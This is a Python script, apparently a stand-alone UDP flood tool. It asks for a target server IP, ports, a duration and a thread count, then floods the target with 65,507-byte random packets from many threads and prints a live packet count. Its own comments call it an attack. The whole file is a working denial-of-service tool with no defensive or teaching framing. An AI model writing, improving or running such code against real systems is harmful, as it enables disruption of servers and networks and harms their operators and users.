import os
import socket
import threading
import time

# Function to send packets
def send_packets(ip, port, duration, packet_count):
    # Create a UDP socket for sending packets
    tmp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Maximum UDP packet size (65,507 bytes)
    data = os.urandom(65507)  # Random data for maximum packet size

    # Get the end time for the attack
    end_time = time.time() + duration

    # Start sending packets as fast as possible
    while time.time() < end_time:
        try:
            tmp_sock.sendto(data, (ip, port))
            packet_count[0] += 1
        except socket.error:
            pass  # Ignore any errors if the server drops packets

    tmp_sock.close()

# Function to display progress without slowing down the attack
def show_progress(packet_count, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        remaining = max(0, duration - elapsed)

        # Display the number of packets sent every second
        print(f"Packets sent: {packet_count[0]} | Time remaining: {int(remaining)} seconds", end='\r')

        # Sleep for 1 second before updating
        time.sleep(1)

# Function to start the attack
def start_attack(ip, ports, duration, thread_count):
    packet_count = [0]  # Shared packet count for all threads (list for mutability)

    # Start packet-sending threads for each port
    for port in ports:
        for _ in range(thread_count):
            thread = threading.Thread(target=send_packets, args=(ip, port, duration, packet_count))
            thread.daemon = True  # Mark as daemon so they exit cleanly
            thread.start()

    # Start progress display thread
    progress_thread = threading.Thread(target=show_progress, args=(packet_count, duration))
    progress_thread.start()

    # Wait for progress thread to complete
    progress_thread.join()

if __name__ == "__main__":
    # Get inputs from user
    ip = input("Enter the server IP: ")
    ports = list(map(int, input("Enter the target ports (comma-separated): ").split(',')))
    duration = int(input("Enter the duration of the attack in seconds: "))  # Duration in seconds
    thread_count = int(input("Enter the number of threads per port: "))

    # Start the attack
    start_attack(ip, ports, duration, thread_count)
